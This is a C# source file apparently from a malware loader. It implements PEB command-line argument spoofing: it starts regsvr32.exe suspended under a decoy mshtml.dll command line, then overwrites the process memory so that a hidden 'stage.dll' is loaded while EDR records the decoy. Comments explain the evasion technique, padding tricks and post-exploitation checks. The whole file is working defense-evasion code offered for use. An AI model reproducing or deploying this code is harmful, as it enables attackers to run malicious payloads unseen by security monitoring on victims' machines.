using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public static class Spoof
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int ProcessInformationClass,
        out PROCESS_BASIC_INFORMATION pbi,
        int cb,
        out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint CREATE_SUSPENDED = 0x00000004;
    private const int ProcessBasicInformation = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    private const int CommandLineOffset = 0x70;

    private static void Log(string msg)
    {
        try
        {
            string logPath = @"C:\ProgramData\loader.log";
            string line = DateTime.Now.ToString("[yyyy-MM-dd HH:mm:ss] ") + msg;
            File.AppendAllText(logPath, line + Environment.NewLine, Encoding.Unicode);
        }
        catch { }
    }

    public static void Go()
    {
        // PEB arg-spoof technique (T1055.012):
        //   spoofedCmd -> passed to CreateProcessW. EDR reads the PEB at process
        //                 creation (kernel-side), so EDR sees spoofedCmd.
        //   realCmd    -> written to PEB.Buffer while the process is suspended.
        //                 The process reads the PEB at startup, so the process
        //                 sees realCmd. EDR's earlier read is not refreshed.
        // PEB.Buffer is allocated to fit spoofedCmd's byte length, so spoofedCmd
        // MUST be at least as long as realCmd (in chars) to avoid heap overflow.
        // Pad spoofedCmd with trailing whitespace (outside the quoted DLL path)
        // to match realCmd's length; the trailing chars are ignored by regsvr32's
        // argv parser and are cosmetic noise in the EDR-visible cmdline.
        // Decoy DLL is mshtml.dll (canonical T1218.010 decoy).
        string spoofedCmd = "regsvr32.exe /s \"C:\\Windows\\System32\\mshtml.dll\"                        ";
        string realCmd    = "regsvr32.exe /s \"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\stage.dll\"";

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        PROCESS_INFORMATION pi;

        Log("[*] Creating suspended regsvr32.exe...");
        if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
        {
            int err = Marshal.GetLastWin32Error();
            Log("[-] CreateProcessW FAILED (error " + err + ")");
            return;
        }
        Log("[+] regsvr32.exe created (PID=" + pi.dwProcessId + ")");

        int retLen;
        PROCESS_BASIC_INFORMATION pbi;
        if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
            out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
            out retLen) != 0)
        {
            Log("[-] NtQueryInformationProcess FAILED");
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }
        Log("[+] PEB located");

        byte[] pebBuffer = new byte[IntPtr.Size * 5];
        int bytesRead;
        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out bytesRead))
        {
            Log("[-] ReadProcessMemory(PEB) FAILED");
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }
        Log("[+] PEB read");

        int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
        IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);
        Log("[+] ProcessParameters resolved");

        byte[] cmdBuffer = new byte[16];
        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
        {
            Log("[-] ReadProcessMemory(cmdPtr) FAILED");
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }
        Log("[+] Command line pointer read");

        byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
        IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);

        int written;
        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
        {
            Log("[-] WriteProcessMemory(cmd) FAILED");
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }
        Log("[+] Command line overwritten: stage.dll");

        byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        Buffer.BlockCopy(lengthBytes, 0, cmdBuffer, 0, 2);
        Buffer.BlockCopy(maxLengthBytes, 0, cmdBuffer, 2, 2);
        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
        Log("[+] Command line length updated");

        Log("[*] Resuming regsvr32.exe thread...");
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        // ponytail: regsvr32.exe /s exits cleanly whether DllRegisterServer succeeds
        // or not, so an alive-check is a false-negative. Loader polls for post-ex
        // artifacts (LoaderLog entries from WorkerThread) instead.
        Log("[+] regsvr32.exe resumed, argument spoofing complete");
    }
}
